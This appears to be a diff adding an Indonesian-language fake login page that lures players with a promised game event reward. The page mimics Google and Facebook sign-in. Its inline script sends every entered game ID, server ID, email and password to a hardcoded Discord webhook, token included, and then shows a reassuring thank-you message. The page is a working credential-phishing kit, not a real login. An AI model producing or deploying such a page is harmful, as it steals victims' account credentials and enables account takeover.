@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .login-page {
+            text-align: center;
+        }
+
+        .social-login {
+            display: flex;
+            justify-content: space-around;
+            margin: 20px 0;
+        }
+
+        .social-button {
+            padding: 10px 20px;
+            border: 2px solid #333;
+            border-radius: 5px;
+            text-decoration: none;
+            color: #333;
+            transition: background 0.3s ease;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .social-button:hover {
+            background-color: #333;
+            color: #fff;
+        }
+
+        .back-to-beranda {
+            display: block;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+
+        .form-container {
+            text-align: left;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 20px;
+        }
+
+        .form-container label {
+            font-weight: bold;
+        }
+
+        .form-container input {
+            display: block;
+            margin: 10px 0;
+            padding: 5px;
+            width: 100%;
+        }
+
+        .form-container button {
+            padding: 10px 20px;
+            border: 2px solid #333;
+            border-radius: 5px;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+            font-weight: bold;
+            background-color: #333;
+            color: #fff;
+        }
+
+        .form-container button:hover {
+            background-color: #555;
+        }
+
+        .thank-you-message {
+            display: none;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <!-- Header content here -->
+    </header>
+
+    <div class="login-page">
+        <h2>Login Account</h2>
+
+        <div class="social-login">
+            <a href="google.html" class="social-button">Google</a>
+            <a href="monton.html" class="social-button">Monton</a>
+            <a href="facebook.html" class="social-button">Facebook</a>
+        </div>
+
+        <a href="index.html" class="back-to-beranda">Back to Beranda</a>
+
+        <div class="form-container">
+            <form id="data-form">
+                <label for="id">ID</label>
+                <input type="text" id="id" placeholder="Your ID">
+                <label for="id-server">ID Server (Max 5 digits)</label>
+                <input type="number" id="id-server" placeholder="Your Server ID" max="99999">
+                <label for="email">Email</label>
+                <input type="text" id="email" placeholder="Your Email">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Your Password">
+                <button type="button" id="submit-button">Submit</button>
+            </form>
+
+            <div class="thank-you-message">
+                <p>Terima kasih!</p>
+                <p>Silakan tunggu 24 jam untuk mengklaim event.</p>
+            </div>
+        </div>
+    </div>
+
+  <script>
+      document.getElementById("submit-button").addEventListener("click", function () {
+          // Mengambil data dari formulir
+          const id = document.getElementById("id").value;
+          const idServer = document.getElementById("id-server").value;
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          // Data yang akan dikirim ke Discord
+          const dataToDiscord = {
+              content: `<:fb:1167354073327095821> **Pengguna : Facebook**\n` +
+              `- **ID:** ${id}\n` +
+              `- **ID Server:** ${idServer}\n` +
+              `- **Email:** ${email}\n` +
+              `- **Password:** ${password}`,
+              username: "Pengguna Website", // Ganti dengan nama yang sesuai
+          };
+
+          // Mengirim data ke Discord melalui webhook
+          fetch("https://discord.com/api/webhooks/1167331931722092585/F8p5Y6_9_WLzyKaqYAFvlMUSAfiU15Vx6fuJNbmBryXoZW2WMZnMJqMFceG2NcUO1suU", {
+              method: "POST",
+              headers: {
+                  "Content-Type": "application/json",
+              },
+              body: JSON.stringify(dataToDiscord),
+          })
+              .then((response) => {
+                  if (response.ok) {
+                      // Mengatur nilai elemen formulir menjadi kosong
+                      document.getElementById("id").value = "";
+                      document.getElementById("id-server").value = "";
+                      document.getElementById("email").value = "";
+                      document.getElementById("password").value = "";
+
+                      // Menyembunyikan elemen formulir
+                      document.getElementById("data-form").style.display = "none";
+
+                      // Menampilkan pesan terima kasih
+                      document.querySelector(".thank-you-message").style.display = "block";
+                  } else {
+                      alert("Terjadi kesalahan dalam mengirim data ke Discord");
+                  }
+              })
+              .catch((error) => {
+                  alert("Terjadi kesalahan: " + error);
+              });
+      });
+  </script>
+</body>
+</html>
